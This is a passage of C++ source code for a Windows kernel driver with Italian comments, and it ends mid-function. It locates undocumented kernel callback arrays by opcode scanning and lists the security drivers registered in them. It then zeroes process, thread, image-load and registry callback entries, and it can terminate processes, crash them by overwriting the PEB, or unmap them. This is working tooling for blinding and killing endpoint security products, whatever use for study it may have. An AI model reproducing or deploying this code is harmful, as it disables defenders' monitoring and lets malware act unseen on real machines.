#include "utils.h"



extern "C" NTSTATUS ZwQueryInformationProcess(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL);



NTSTATUS TermProcess(ULONG_PTR pidVal) {
    NTSTATUS status;
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;

    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    cid.UniqueProcess = (HANDLE)pidVal;
    cid.UniqueThread = NULL;

    status = ZwOpenProcess(&hProcess, 1, &oa, &cid);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] ZwOpenProcess failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pidVal, status);
        return STATUS_UNSUCCESSFUL;
    }

    status = ZwTerminateProcess(hProcess, STATUS_SUCCESS);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] ZwTerminateProcess failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pidVal, status);
    }
    else {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
            "[%s] Terminated PID %llu\n",
            DRIVER_NAME, (unsigned long long)pidVal);
    }

    ZwClose(hProcess);

    return STATUS_SUCCESS;
}

NTSTATUS crashProcess(ULONG_PTR pidVal) {
    NTSTATUS status;
    HANDLE hProcess;

    PEPROCESS eProcess = NULL;
    status = PsLookupProcessByProcessId((HANDLE)pidVal, &eProcess);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] PsLookupProcessByProcessId failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pidVal, status);
        return STATUS_UNSUCCESSFUL;
    }

    status = ObOpenObjectByPointer(eProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, &hProcess);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] ObOpenObjectByPointer failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pidVal, status);
        return STATUS_UNSUCCESSFUL;
    }
    // attacchiamo il current kernel thread al target process address space
    KAPC_STATE apcState;
    KeStackAttachProcess(eProcess, &apcState);

    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength = 0;


    // queryaimo info basic sui processi per prendere il PEB base address
    status = ZwQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] ZwQueryInformationProcess failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pidVal, status);
        KeUnstackDetachProcess(&apcState);
        ZwClose(hProcess);
        return STATUS_UNSUCCESSFUL;

    }
    PVOID baseAddress = pbi.PebBaseAddress;
    SIZE_T size = 4096;

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
        "[%s] Crashing PID %llu by writing to PEB at address 0x%p\n",
        DRIVER_NAME, (unsigned long long)pidVal, baseAddress);

    // MDL Memry Descriptor List per il target process.
    if (baseAddress != NULL) {
        PMDL mdl = IoAllocateMdl(baseAddress, (ULONG)size, FALSE, FALSE, NULL);
        if (mdl != NULL) {
            DbgPrintEx(0, 0, "Mdl Allocated\n");

            __try {
                // lockiamo le pagine in memoria fisica e prepariamo per accesso
                MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
                DbgPrintEx(0, 0, "pages locked\n");

                PVOID mappedAddress = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);

                if (mappedAddress != NULL) {
                    DbgPrintEx(0, 0, "pages mapped at address: %p\n", mappedAddress);

                    RtlFillMemory(mappedAddress, size, 0xcc);
                    DbgPrintEx(0, 0, "[%s] Memory corrupted.\n", DRIVER_NAME);
                    MmUnmapLockedPages(mappedAddress, mdl);
                    DbgPrintEx(0, 0, "[%s] Pages unmapped.\n", DRIVER_NAME);
                }
                // unlock pages
                MmUnlockPages(mdl);
                DbgPrintEx(0, 0, "[%s] Pages unlocked.\n", DRIVER_NAME);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                DbgPrintEx(0, 0, "[%s] Exception while accessing process memory.\n", DRIVER_NAME);
                return STATUS_UNSUCCESSFUL;
            }
            IoFreeMdl(mdl);
        }
    }
    KeUnstackDetachProcess(&apcState);


    ZwClose(hProcess);
    ObDereferenceObject(eProcess);

    return STATUS_SUCCESS;
}

NTSTATUS unmapProcess(ULONG_PTR pidVal) {
    NTSTATUS status;
    PEPROCESS eProcess = NULL;
	PVOID baseAddress = 0;
    status = PsLookupProcessByProcessId((HANDLE)pidVal, &eProcess);

    PFN_PsGetProcessSectionBaseAddress pPsGetProcessSectionBaseAddress = NULL;
    PFN_MmUnmapViewOfSection pMmUnmapViewOfSection = NULL;

	UNICODE_STRING routineName;

	RtlInitUnicodeString(&routineName, L"PsGetProcessSectionBaseAddress");

	pPsGetProcessSectionBaseAddress = (PFN_PsGetProcessSectionBaseAddress)MmGetSystemRoutineAddress(&routineName);

	RtlInitUnicodeString(&routineName, L"MmUnmapViewOfSection");

	pMmUnmapViewOfSection = (PFN_MmUnmapViewOfSection)MmGetSystemRoutineAddress(&routineName);

	baseAddress = (PVOID)pPsGetProcessSectionBaseAddress(eProcess);


	status = pMmUnmapViewOfSection(eProcess, baseAddress);

    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] MmUnmapViewOfSection failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pidVal, status);
        return STATUS_UNSUCCESSFUL;
    }
    else {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
            "[%s] Unmapped section of PID %llu\n",
            DRIVER_NAME, (unsigned long long)pidVal);
    }
    ObDereferenceObject(eProcess);
	return STATUS_SUCCESS;
}

ModulesData* EnumRegisteredDrivers(UINT64 NotifyArrayAddr) {
    ModulesData moduleInfo = { 0 };
    NTSTATUS status = STATUS_SUCCESS;
    UINT64 callbackAddr = 0;
    UINT64 tmpPtr = 0;
    //LPVOID* 

	ModulesDataArray result = { 0 };
	ModulesData* modules;

	modules = (ModulesData*)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(ModulesData) * 64, DRIVER_TAG);
    if (modules == NULL) {
        DbgPrintEx(0, 0, "[%s] ExAllocatePool2 failed\n", DRIVER_NAME);
        return NULL;
	}
	int modulesCount = 0;

    for (int i = 0; i < 64; i++) {
        tmpPtr = NotifyArrayAddr + i * 8;
        callbackAddr = *(PUINT64)(tmpPtr);

        //callbackAddr = *(callbackAddr & 0xfffffffffffffff8); // Mask to get the actual address (for x64 systems)

        //DbgPrintEx(0, 0, "[%s] Process Notify Callback %d Address: 0x%llx\n", DRIVER_NAME, i, callbackAddr);

        if (callbackAddr && MmIsAddressValid((PVOID)callbackAddr)) {
            callbackAddr = *(PUINT64)(callbackAddr & 0xfffffffffffffff8); // Mask to get the actual address (for x64 systems)
            status = SearchModules(callbackAddr, &moduleInfo);
            if (NT_SUCCESS(status)) {
                //DbgPrintEx(0, 0, "[%s] Process Notify Callback %d: 0x%llx in module %s\n", DRIVER_NAME, i, callbackAddr, (PCSTR)moduleInfo.ModuleName);
				modules[i] = moduleInfo;
            }
            //else {
            //    //DbgPrintEx(0, 0, "[%s] Process Notify Callback %d: 0x%llx in unknown module\n", DRIVER_NAME, i, callbackAddr);
            //}
        }
        modulesCount++;

    }
    // print modules to double check

    for (int j = 0; j < modulesCount; j++) {
        if (modules[j].ModuleBase == 0)
			continue;
        DbgPrintEx(0, 0, "[%s] Found Module %d: %s at base address: 0x%llx\n",
            DRIVER_NAME,
            j,
            (PCSTR)modules[j].ModuleName,
            (ULONG64)modules[j].ModuleBase);
	}



	return modules;
}

UINT64 FindProcNotifyRoutineAddress(UINT64 kernelBase, NOTIFY_ROUTINE_TYPE callbackType) {
    UINT64 routineAddress = 0;
    UINT64 tempAddress = 0;
    UINT64 notifyArrayAddress = 0;
    UNICODE_STRING routineName;

    UNREFERENCED_PARAMETER(kernelBase);
    UNREFERENCED_PARAMETER(callbackType);

    RtlInitUnicodeString(&routineName, L"PsSetCreateProcessNotifyRoutine");


    routineAddress = (UINT64)MmGetSystemRoutineAddress(&routineName);
    if (!routineAddress) {
        DbgPrintEx(0, 0, "[%s] MmGetSystemRoutineAddress failed to get PsSetCreateProcessNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }
    // PRATICAMENTE TROVIAMO LA CALL A PspSetCreateProcessNotifyRoutine. PsSetCreateProcessNotifyRoutine FA UNA CALL A PspSetCreateProcessNotifyRoutine CHE A SUA VOLTA FA UNA LEA CHE CARICA L'INDIRIZZO DELL'ARRAY DI CALLBACK IN R13
    for (int offset = 0; offset < 0x100; offset++) {
        unsigned char instruction = *((unsigned char*)(routineAddress + offset));
        if (instruction == 0xe9 || instruction == 0xe8) { // CALL or JMP
            LONG relativeOffset = *((LONG*)(routineAddress + offset + 1));

            tempAddress = routineAddress + offset + 5 + relativeOffset;
            break;
        }
    }
    if (!tempAddress) {
        DbgPrintEx(0, 0, "[%s] Failed to find call/jmp instruction in PsSetCreateProcessNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }

    //effettivamente la prima lea di PspSetCreateProcessNotifyRoutine. carica in r13 l'indirizzo di PspCreateProcessNotifyRoutine

    for (int offset = 0; offset < 300; offset++) {
        unsigned char prefix = *((unsigned char*)(tempAddress + offset));
        if ((prefix == 0x48 || prefix == 0x4C) && (*(unsigned char*)(tempAddress + offset + 1) == 0x8D)) { // LEA
            LONG relativeOffset = *((LONG*)(tempAddress + offset + 3));

            notifyArrayAddress = tempAddress + offset + 7 + relativeOffset;
            break;
        }
    }

    return notifyArrayAddress;
}

UINT64 FindThreadNotifyRoutineAddress(UINT64 kernelBase, NOTIFY_ROUTINE_TYPE callbackType) {
    UINT64 routineAddress = 0;
    UINT64 tempAddress = 0;
    UINT64 notifyArrayAddress = 0;
    UNICODE_STRING routineName;

    UNREFERENCED_PARAMETER(kernelBase);
    UNREFERENCED_PARAMETER(callbackType);

    RtlInitUnicodeString(&routineName, L"PsSetCreateThreadNotifyRoutine");


    routineAddress = (UINT64)MmGetSystemRoutineAddress(&routineName);
    if (!routineAddress) {
        DbgPrintEx(0, 0, "[%s] MmGetSystemRoutineAddress failed to get PsSetCreateThreadNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }
    // PRATICAMENTE TROVIAMO LA CALL A PspSetCreateThreadNotifyRoutine. PsSetCreateProcessNotifyRoutine FA UNA CALL A PsSetCreateThreadNotifyRoutine CHE A SUA VOLTA FA UNA LEA CHE CARICA L'INDIRIZZO DELL'ARRAY DI CALLBACK IN R13
    for (int offset = 0; offset < 0x100; offset++) {
        unsigned char instruction = *((unsigned char*)(routineAddress + offset));
        if (instruction == 0xe9 || instruction == 0xe8) { // CALL or JMP
            LONG relativeOffset = *((LONG*)(routineAddress + offset + 1));

            tempAddress = routineAddress + offset + 5 + relativeOffset;
            break;
        }
    }
    if (!tempAddress) {
        DbgPrintEx(0, 0, "[%s] Failed to find call/jmp instruction in PsSetCreateThreadNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }

    //effettivamente la prima lea di PspSetCreateProcessNotifyRoutine. carica in r13 l'indirizzo di PspCreateProcessNotifyRoutine

    for (int offset = 0; offset < 300; offset++) {
        unsigned char prefix = *((unsigned char*)(tempAddress + offset));
        if ((prefix == 0x48 || prefix == 0x4C) && (*(unsigned char*)(tempAddress + offset + 1) == 0x8D)) { // LEA
            LONG relativeOffset = *((LONG*)(tempAddress + offset + 3));

            notifyArrayAddress = tempAddress + offset + 7 + relativeOffset;
            break;
        }
    }

    return notifyArrayAddress;
}

// here the first call calls PsSetLoadImageNotifyRoutineEx, also the first LEA of PspSetLoadImageNotifyRoutineEx loads in R13 the address of the array of callbacks
UINT64 FindLoadImageNotifyRoutineAddress(UINT64 kernelBase, NOTIFY_ROUTINE_TYPE callbackType) {
    UINT64 routineAddress = 0;
    UINT64 tempAddress = 0;
    UINT64 notifyArrayAddress = 0;
    UNICODE_STRING routineName;

    UNREFERENCED_PARAMETER(kernelBase);
    UNREFERENCED_PARAMETER(callbackType);

    RtlInitUnicodeString(&routineName, L"PsSetLoadImageNotifyRoutine");

    
    routineAddress = (UINT64)MmGetSystemRoutineAddress(&routineName);
    if (!routineAddress) {
        DbgPrintEx(0, 0, "[%s] MmGetSystemRoutineAddress failed to get PsSetLoadImageNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }
    // PRATICAMENTE TROVIAMO LA CALL A PspSetCreateThreadNotifyRoutine. PsSetLoadImageNotifyRoutine FA UNA CALL A PsSetLoadImageNotifyRoutineEx CHE A SUA VOLTA FA UNA LEA CHE CARICA L'INDIRIZZO DELL'ARRAY DI CALLBACK IN R13
    for (int offset = 0; offset < 0x100; offset++) {
        unsigned char instruction = *((unsigned char*)(routineAddress + offset));
        if (instruction == 0xe9 || instruction == 0xe8) { // CALL or JMP
            LONG relativeOffset = *((LONG*)(routineAddress + offset + 1));

            tempAddress = routineAddress + offset + 5 + relativeOffset;
            break;
        }
    }
    if (!tempAddress) {
        DbgPrintEx(0, 0, "[%s] Failed to find call/jmp instruction in PsSetLoadImageNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }


    for (int offset = 0; offset < 300; offset++) {
        unsigned char prefix = *((unsigned char*)(tempAddress + offset));
        if ((prefix == 0x48 || prefix == 0x4C) && (*(unsigned char*)(tempAddress + offset + 1) == 0x8D)) { // LEA
            LONG relativeOffset = *((LONG*)(tempAddress + offset + 3));

            notifyArrayAddress = tempAddress + offset + 7 + relativeOffset;
            break;
        }
    }

    return notifyArrayAddress;
}
//CmRegistercallback----1st call---- > CmpRegisterCallbackInternal----5th call oppure subito dopo(quindi 9 0xcc prima)----->CmpInsertCallbackInListByAltitude
// -- primo LEA-- > CallbackListHead

UINT64 FindRegCallbackNotifyRoutineAddress(UINT64 kernelBase, NOTIFY_ROUTINE_TYPE callbackType) {
    UINT64 routineAddress = 0;
    UINT64 tempAddress = 0;
	UINT64 CmpInsertCallbackInListByAltitudeAddress = 0;
    UINT64 notifyArrayAddress = 0;
    UNICODE_STRING routineName;

    UNREFERENCED_PARAMETER(kernelBase);
    UNREFERENCED_PARAMETER(callbackType);
    RtlInitUnicodeString(&routineName, L"CmRegisterCallback");


    routineAddress = (UINT64)MmGetSystemRoutineAddress(&routineName);
    if (!routineAddress) {
        DbgPrintEx(0, 0, "[%s] MmGetSystemRoutineAddress failed to get CmRegistercallback\n", DRIVER_NAME);
        return 0;
    }

    for (int offset = 0; offset < 0x100; offset++) {
        unsigned char instruction = *((unsigned char*)(routineAddress + offset));
        if (instruction == 0xe9 || instruction == 0xe8) { // CALL or JMP
            LONG relativeOffset = *((LONG*)(routineAddress + offset + 1));
            tempAddress = routineAddress + offset + 5 + relativeOffset;
            break;
        }
	}

    if (!tempAddress) {
        DbgPrintEx(0, 0, "[%s] Failed to find call/jmp instruction in PsSetLoadImageNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }
    //CmpRegisterCallbackInternal----5th call oppure subito dopo(quindi 9 0xcc prima)----->CmpInsertCallbackInListByAltitude
    for (int offset = 0; offset < 0x200; offset++) {
        unsigned char prefix = *((unsigned char*)(tempAddress + offset));
        unsigned char prevPrefix = *((unsigned char*)(tempAddress + offset - 1));

        if ((prefix == 0xcc && prevPrefix == 0xcc) && (*(unsigned char*)(tempAddress + offset + 1) == 0x48)) { // 
            //LONG relativeOffset = *((LONG*)(tempAddress + offset + 3));

            CmpInsertCallbackInListByAltitudeAddress = tempAddress + offset + 1;
            break;
        }
    }
    if (!CmpInsertCallbackInListByAltitudeAddress) {
        DbgPrintEx(0, 0, "[%s] Failed to find CmpInsertCallbackInListByAltitudeAddress instruction in CmRegistercallback\n", DRIVER_NAME);
        return 0;
	}
	DbgPrintEx(0, 0, "[%s] CmpInsertCallbackInListByAltitudeAddress: 0x%llx\n", DRIVER_NAME, CmpInsertCallbackInListByAltitudeAddress);
    
    for (int offset = 0; offset < 300; offset++) {
        unsigned char prefix = *((unsigned char*)(CmpInsertCallbackInListByAltitudeAddress + offset));
        if ((prefix == 0x48 || prefix == 0x4C) && (*(unsigned char*)(CmpInsertCallbackInListByAltitudeAddress + offset + 1) == 0x8D)) { // LEA
            LONG relativeOffset = *((LONG*)(CmpInsertCallbackInListByAltitudeAddress + offset + 3));

            notifyArrayAddress = CmpInsertCallbackInListByAltitudeAddress + offset + 7 + relativeOffset;
            break;
        }
    }
    if (!notifyArrayAddress) {
        DbgPrintEx(0, 0, "[%s] Failed to find LEA instruction in CmpInsertCallbackInListByAltitudeAddress\n", DRIVER_NAME);
        return 0;
	}

	return notifyArrayAddress;
}


NTSTATUS SearchModules(ULONG64 ModuleAddr, ModulesData* ModuleFound) {
    NTSTATUS status = STATUS_SUCCESS;
    ULONG modulesSize = 0;
    AUX_MODULE_EXTENDED_INFO* modules = NULL;
    ULONG numberOfModules = 0;

    // Step 1: Initialize the Auxiliary Kernel Library
    status = AuxKlibInitialize();
    if (!NT_SUCCESS(status))
    {
        DbgPrintEx(0, 0, "[%s] AuxKlibInitialize fail %d\n", DRIVER_NAME, status);
        return status;
    }

    ModulesData ModuleFound2 = *ModuleFound;
    // take info abt kernel drivers
    status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), NULL);

    if (!NT_SUCCESS(status) || modulesSize == 0) {
        DbgPrintEx(0, 0, "[%s] AuxKlibQueryModuleInformation failed to get size (0x%X)\n", DRIVER_NAME, status);
        return status;
    }

    numberOfModules = modulesSize / sizeof(AUX_MODULE_EXTENDED_INFO);

    modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePool2(POOL_FLAG_PAGED, modulesSize, DRIVER_TAG);
    if (modules == NULL) {
        DbgPrintEx(0, 0, "[%s] ExAllocatePool2 failed\n", DRIVER_NAME);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    // Query module information into the allocated buffer
    status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), modules);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(0, 0, "[%s] AuxKlibQueryModuleInformation failed (0x%X)\n", DRIVER_NAME, status);
        ExFreePoolWithTag(modules, DRIVER_TAG);
        return status;
    }


    DbgPrintEx(0, 0, "[%s] Searching for module containing address: 0x%llx\n", DRIVER_NAME, ModuleAddr);
    for (ULONG i = 0; i < numberOfModules; i++) {
        //     DbgPrintEx(0, 0, "[%s] Module %d: %s at base address: 0x%llx, size: 0x%x\n",
        //         DRIVER_NAME,
        //         i,
        //         (PCSTR)&modules[i].FullPathName[modules[i].FileNameOffset],
        //         (ULONG64)modules[i].BasicInfo.ImageBase,
                 //modules[i].ImageSize);
        if ((ModuleAddr > (ULONG64)modules[i].BasicInfo.ImageBase) && (ModuleAddr < ((ULONG64)modules[i].BasicInfo.ImageBase + modules[i].ImageSize))) {
            //DbgPrintEx(0, 0, "[%s] Found module: %s at base address: 0x%llx\n",
            //    DRIVER_NAME,
            //    (PCSTR)&modules[i].FullPathName[modules[i].FileNameOffset],
            //    (ULONG64)modules[i].BasicInfo.ImageBase);


            strcpy(ModuleFound2.ModuleName, (CHAR*)(modules[i].FullPathName + modules[i].FileNameOffset));
			memcpy(&ModuleFound2.ModuleBase, &modules[i].BasicInfo.ImageBase, sizeof(ULONG64));
            *ModuleFound = ModuleFound2;

            DbgPrintEx(0, 0, "[%s] Module name: %s\n", DRIVER_NAME, ModuleFound2.ModuleName);
            ExFreePoolWithTag(modules, DRIVER_TAG);
            return status;
        }
    }

    ExFreePoolWithTag(modules, DRIVER_TAG);
    return status;

}


NTSTATUS DeleteNotifyEntry(ULONG64 procNotifyArrayAddr, int  indexToRemove) {
	*(ULONG64*)(procNotifyArrayAddr + indexToRemove * 8) = (ULONG64)0;
    if (*(ULONG64*)(procNotifyArrayAddr + indexToRemove * 8) == 0) {
        DbgPrintEx(0, 0, "[%s] Successfully removed entry at index %d\n", DRIVER_NAME, indexToRemove);
        return STATUS_SUCCESS;
    }
    else {
        DbgPrintEx(0, 0, "[%s] Failed to remove entry at index %d\n", DRIVER_NAME, indexToRemove);
        return STATUS_UNSUCCESSFUL;
	}
}

ModulesData* EnumRegCallbackDrivers(ULONG64 regNotifyArrayAddr)
{
    if (regNotifyArrayAddr == 0) {
        return NULL;
    }

    // massimale: 64 elementi (come nel tuo codice)
    const int kMax = 64;
    int counter = 0;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    ModulesData tmpMod = { 0 };

    ModulesData* moduleDatas = (ModulesData*)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(ModulesData) * kMax, DRIVER_TAG);
    if (!moduleDatas) {
        return NULL;
    }
    RtlZeroMemory(moduleDatas, sizeof(ModulesData) * kMax);

    // head per riconoscere quando chiudere il giro della lista
    PREGISTRY_CALLBACK_ITEM head = (PREGISTRY_CALLBACK_ITEM)regNotifyArrayAddr;

    // puntatore corrente
    PREGISTRY_CALLBACK_ITEM curr = head;

    // loop con protezioni
    while (counter < kMax) {
        // Proteggi l’accesso a campi potenzialmente corrotti
        __try {
            // Verifica che l’indirizzo di curr sia valido
            if (!MmIsAddressValid(curr)) break;

            // Leggi la function pointer del callback
            ULONG64 cbFunc = curr->Function;

            // Se l’indirizzo della funzione non è plausibile, salta/segna vuoto
            if (cbFunc == 0 || !MmIsAddressValid((PVOID)cbFunc)) {
                RtlZeroMemory(&moduleDatas[counter], sizeof(ModulesData));
            }
            else {
                // Risolvi il modulo contenente cbFunc
                status = SearchModules(cbFunc, &tmpMod);
                if (NT_SUCCESS(status)) {
                    moduleDatas[counter] = tmpMod;
                }
                else {
                    RtlZeroMemory(&moduleDatas[counter], sizeof(ModulesData));
                }
            }

            // Avanza al prossimo elemento della lista
            PLIST_ENTRY flink = curr->Item.Flink;

            // Controlli di consistenza sul link
            if (flink == NULL) break;                          // lista rotta
            if (!MmIsAddressValid(flink)) break;               // link invalido
            if (flink == &curr->Item) break;                   // self-loop anomalo

            // Se torniamo alla head, abbiamo completato il giro
            if (flink == &head->Item) {
                counter++;
                break;
            }

            // Siccome Item è il primo campo, l’indirizzo della struct coincide con quello di Item
            curr = (PREGISTRY_CALLBACK_ITEM)flink;

            counter++;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            // Qualsiasi AV o accesso invalido finisce qui: usciamo pulitamente
            break;
        }
    }

    // Se vuoi, potresti restituire anche il numero valido (counter) via out-param.
    // Qui mantengo la tua firma e lascio gli slot non usati a zero.
    return moduleDatas;
}

ModulesData* EnumObjCallbackDrivers() {
    DWORD64 ProcessObjectType = (DWORD64)*PsProcessType;
    DWORD64 ThreadObjectType = (DWORD64)*PsThreadType;
    NTSTATUS status;

    LIST_ENTRY* procListHead = (LIST_ENTRY*)(ProcessObjectType + 0xc8);
    
    LIST_ENTRY* threadListHead = (LIST_ENTRY*)(ThreadObjectType + 0xc8);

    //ModulesData* procModules = (ModulesData*)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(ModulesData) * 64, DRIVER_TAG);
    //ModulesData* threadModules = (ModulesData*)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(ModulesData) * 64, DRIVER_TAG);
    ModulesData* allMods = (ModulesData*)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(ModulesData) * 128, DRIVER_TAG);


    int counter = 0;

    LIST_ENTRY* tmpEntry = procListHead->Flink;

    while (tmpEntry != procListHead) {
        ModulesData module;
        OB_CALLBACK_ENTRY* objEntry = CONTAINING_RECORD(tmpEntry, OB_CALLBACK_ENTRY, CallbackList);
        if (MmIsAddressValid(objEntry) && MmIsAddressValid(objEntry->PreOperation)) {
            ULONG64 address = (ULONG64)objEntry->PreOperation;
            status = SearchModules(address, &module);
            if (NT_SUCCESS(status)) {
                allMods[counter] = module;
            }
        }
        else if (MmIsAddressValid(objEntry) && MmIsAddressValid(objEntry->PostOperation)) {
            ULONG64 address = (ULONG64)objEntry->PostOperation;
            status = SearchModules(address, &module);
            if (NT_SUCCESS(status)) {
                allMods[counter] = module;
            }
        }
        else {
            break;
        }

        tmpEntry = tmpEntry->Flink;
        counter += 1;
    } 

    counter = 63;

    tmpEntry = threadListHead->Flink;
    while (tmpEntry != threadListHead) {
        ModulesData module;
        OB_CALLBACK_ENTRY* objEntry = CONTAINING_RECORD(tmpEntry, OB_CALLBACK_ENTRY, CallbackList);
        if (MmIsAddressValid(objEntry) && MmIsAddressValid(objEntry->PreOperation)) {
            ULONG64 address = (ULONG64)objEntry->PreOperation;
            status = SearchModules(address, &module);
            if (NT_SUCCESS(status)) {
                allMods[counter] = module;
            }
        }
        else if (MmIsAddressValid(objEntry) && MmIsAddressValid(objEntry->PostOperation)) {
            ULONG64 address = (ULONG64)objEntry->PostOperation;
            status = SearchModules(address, &module);
            if (NT_SUCCESS(status)) {
                allMods[counter] = module;
            }
        }
        else {
            break;
        }

        tmpEntry = tmpEntry->Flink;
        counter += 1;
    }
    
    return allMods;
}

MinifilterData* EnumMiniFiltersDrv() {
    NTSTATUS status = STATUS_SUCCESS;
    PFLT_FILTER* filterList = NULL;             // Pointer to array of filter objects
    ULONG filterCount = 0;                      // Number of minifilters found
    ULONG bufferSize = 0;                       // Size of buffer needed for filter list

    // Enumero i filtri per prendere il numero di filtri da allocare
    status = FltEnumerateFilters(NULL, bufferSize, &filterCount);
    if (status != STATUS_BUFFER_TOO_SMALL) { // This call is expected to fail with STATUS_BUFFER_TOO_SMALL
        return NULL;
    }


    bufferSize = filterCount * sizeof(PFLT_FILTER);
    filterList = (PFLT_FILTER*)ExAllocatePool2(POOL_FLAG_NON_PAGED, bufferSize, DRIVER_TAG);
    if (!filterList) {
        return NULL;
    }


    // Ci filla filterList con i vari minifilters
    status = FltEnumerateFilters(filterList, bufferSize, &filterCount);
    if (!NT_SUCCESS(status)) {
        ExFreePool(filterList);
        return NULL;
    }

    MinifilterData* filtersData = (MinifilterData*)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(MinifilterData) * filterCount, DRIVER_TAG);
    // Prepare output buffer to store minifilter data
    for (size_t i = 0; i < filterCount; i++) {
        PFLT_FILTER filter = filterList[i];     // Current filter object
        PFILTER_AGGREGATE_BASIC_INFORMATION filterInfo = NULL; // Structure to hold filter info
        ULONG filterInfoSize = 0;               // Size of returned filter info
        ULONG filterInfoBufferSize = 0;         // Size needed for filter info buffer

        // Get required buffer size for filter information
        status = FltGetFilterInformation(filter, FilterAggregateBasicInformation, NULL, 0, &filterInfoBufferSize);
        if (status != STATUS_BUFFER_TOO_SMALL) {
            // Skip to next filter if initial call fails unexpectedly
            continue;
        }

        // Allocate memory for filter information
        filterInfo = (PFILTER_AGGREGATE_BASIC_INFORMATION)ExAllocatePool2(POOL_FLAG_NON_PAGED, filterInfoBufferSize, DRIVER_TAG);
        if (!filterInfo) {
            // Skip to next filter if allocation fails
            continue;
        }

        // Retrieve detailed filter information
        status = FltGetFilterInformation(filter, FilterAggregateBasicInformation, filterInfo, filterInfoBufferSize, &filterInfoSize);
        if (!NT_SUCCESS(status)) {
            // Free memory and skip if retrieval fails
            ExFreePool(filterInfo);
            continue;
        }
        // Extract filter name and altitude from info structure
        PWCHAR filterNameAddr = (PWCHAR)((PCHAR)filterInfo + filterInfo->Type.MiniFilter.FilterNameBufferOffset);
        PWCHAR filterAltitudeAddr = (PWCHAR)((PCHAR)filterInfo + filterInfo->Type.MiniFilter.FilterAltitudeBufferOffset);

        // Copy filter name to output buffer with length safety
        wcsncpy(filtersData[i].FilterName, filterNameAddr, min(filterInfo->Type.MiniFilter.FilterNameLength / sizeof(WCHAR), 255));
        filtersData[i].FilterName[min(filterInfo->Type.MiniFilter.FilterNameLength / sizeof(WCHAR), 255)] = L'\0';

        // Copy filter altitude to output buffer with length safety
        wcsncpy(filtersData[i].FilterAltitude, filterAltitudeAddr, min(filterInfo->Type.MiniFilter.FilterAltitudeLength / sizeof(WCHAR), 255));
        filtersData[i].FilterAltitude[min(filterInfo->Type.MiniFilter.FilterAltitudeLength / sizeof(WCHAR), 255)] = L'\0';

        // Clean up filter info memory
        ExFreePool(filterInfo);
    }


    // Clean up filter list memory
    ExFreePool(filterList);

    return filtersData;

}

NTSTATUS DeleteRegCallbackEntry(ULONG64 regNotifyArrayAddr, CHAR* moduleName)
{
    if (regNotifyArrayAddr == 0 || moduleName == NULL || moduleName[0] == '\0')
        return STATUS_INVALID_PARAMETER;

    // ATTENZIONE: questa operazione è altamente rischiosa.
    // Stai manipolando una lista mantenuta dal Configuration Manager.
    // Fallo solo in laboratorio e consapevole che puoi causare bugcheck.

    NTSTATUS status = STATUS_NOT_FOUND;
    const int kMaxWalk = 4096; // anti-loop

    PREGISTRY_CALLBACK_ITEM head = (PREGISTRY_CALLBACK_ITEM)regNotifyArrayAddr;
    PREGISTRY_CALLBACK_ITEM curr = head;

    int walked = 0;
    __try
    {
        while (walked++ < kMaxWalk)
        {
            if (!MmIsAddressValid(curr))
                break;

            // Leggi info sulla funzione del callback
            ULONG64 cbFunc = curr->Function;

